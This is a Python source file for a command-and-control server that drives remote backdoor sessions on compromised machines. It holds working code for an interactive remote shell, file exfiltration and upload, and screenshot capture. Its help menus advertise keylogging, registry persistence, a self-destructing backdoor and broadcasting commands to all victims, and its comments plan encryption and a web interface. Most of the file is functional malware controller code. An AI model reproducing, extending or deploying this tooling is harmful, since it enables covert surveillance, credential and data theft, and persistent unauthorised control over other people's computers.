import socket
import json
import os
import threading

# Local class imports
from colour import banner, Colour


def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


# This function is to stop server.py issuing reliable_send if command='help' or 'clear'
# Creates less network traffic.
def exclusion_words(command):
    exclusion_words = ['help', 'clear']  # make this global variable
    if command == exclusion_words:
        return 1


def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(2)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def screenshot(target, count):
    directory = './screenshots'
    if not os.path.exists(directory):
        os.makedirs(directory)
    f = open(directory + '/screenshot_%d.png' % (count), 'wb')  # if target=Linux then #apt-get install scrot
    target.settimeout(3)
    try:
        chunk = target.recv(10485760)  # 10MB
    except:
        pass

    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(10485760)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
    count += 1


# TODO: webcam(target) takes a quick webcam image
# https://stackoverflow.com/a/69282582/4443012

# TODO: encrypt()
# TODO: decrypt() functions using RSA library AES128-GCM

# TODO: use Flask to create a frontend UI in the web browser to manage C2 https://github.com/Tomiwa-Ot/moukthar


def server_help_manual():
    print('''\n
    quit                                --> Quit Session With The Target
    clear                               --> Clear The Screen
    background                          --> Send Session With Target To Background
    cd *Directory name*                 --> Changes Directory On Target System
    upload *file name*                  --> Upload File To The Target Machine From Working Dir 
    download *file name*                --> Download File From Target Machine
    get *url*                           --> Download File From Specified URL to Target ./
    keylog_start                        --> Start The Keylogger
    keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
    keylog_stop                         --> Stop And Self Destruct Keylogger File
    screenshot                          --> Takes screenshot and sends to server ./screenshots/
    start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
    remove_backdoor                     --> Removes backdoor from target!!!
    
    ===Windows Only===
    persistence *RegName* *filename*    --> Create Persistence In Registry
                                            copies backdoor to ~/AppData/Roaming/filename
                                            example: persistence Backdoor windows32.exe
    check                               --> Check If Has Administrator Privileges


    \n''')


def c2_help_manual():
    print('''\n
    ===Command and Control (C2) Manual===

    targets                 --> Prints Active Sessions
    session *session num*   --> Will Connect To Session (background to return)
    clear                   --> Clear Terminal Screen
    exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
    kill *session num*      --> Issue 'quit' To Specified Target Session
    sendall *command*       --> Sends The *command* To ALL Active Sessions (sendall notepad)
    \n''')


def target_communication(target, ip):
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            screenshot(target, count)
            count = count + 1
        elif command == 'help':
            server_help_manual()
        else:
            result = reliable_recv(target)
            print(result)


def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            # print(termcolor.colored(str(ip) + ' has connected!', 'green'))
            print(Colour().green(str(ip) + ' has connected!') +
                  '\n[**] Command & Control Center: ', end="")
        except:
            pass


# Work in progress (currently 'exit' command is buggy when issued from c2()
# def c2():
#
# def exit_c2(targets, t1, sock):  # function of: elif command == 'exit':
#     for target in targets:
#         reliable_send(target, 'quit')
#         target.close()
#     sock.close()
#     stop_flag = True
#     t1.join()


if __name__ == '__main__':
    targets = []
    ips = []
    stop_flag = False
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('127.0.0.1', 5555))
    sock.listen(5)
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    print(banner())
    print('Run "help" command to see the usage manual')
    print(Colour().green('[+] Waiting For The Incoming Connections ...'))

    while True:
        try:
            command = input('[**] Command & Control Center: ')
            if command == 'targets':
                counter = 0
                for ip in ips:
                    print('Session ' + str(counter) + ' --- ' + str(ip))
                    counter += 1
            elif command == 'clear':
                os.system('clear')
            elif command[:7] == 'session':
                try:
                    num = int(command[8:])
                    tarnum = targets[num]
                    tarip = ips[num]
                    target_communication(tarnum, tarip)
                except:
                    print('[-] No Session Under That ID Number')
            elif command == 'exit':
                for target in targets:
                    reliable_send(target, 'quit')
                    target.close()
                sock.close()
                stop_flag = True
                t1.join()
                break
            elif command[:4] == 'kill':
                targ = targets[int(command[5:])]
                ip = ips[int(command[5:])]
                reliable_send(targ, 'quit')
                targ.close()
                targets.remove(targ)
                ips.remove(ip)
            elif command[:7] == 'sendall':
                x = len(targets)
                print(x)
                i = 0
                try:
                    while i < x:
                        tarnumber = targets[i]
                        print(tarnumber)
                        reliable_send(tarnumber, command)
                        i += 1
                except:
                    print('Failed')
            elif command[:4] == 'help':
                c2_help_manual()
            else:
                print(Colour().red('[!!] Command Doesnt Exist'))
        except (KeyboardInterrupt, SystemExit):
            if input('\nDo you want to exit? yes/no: ') == 'yes':
                sock.close()
                print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))
                break
        except ValueError as e:
            print(Colour().red('[!!] ValueError: ' + str(e)))
            continue

# TODO: encrypt connection
# TODO: Implement a 'pulse' feature between server and backdoor (Keep alive)
# This will ensure if server.py crashes the backdoor will after 60s will realise server is not listen on socket
# and will attempt to run connection() function again.
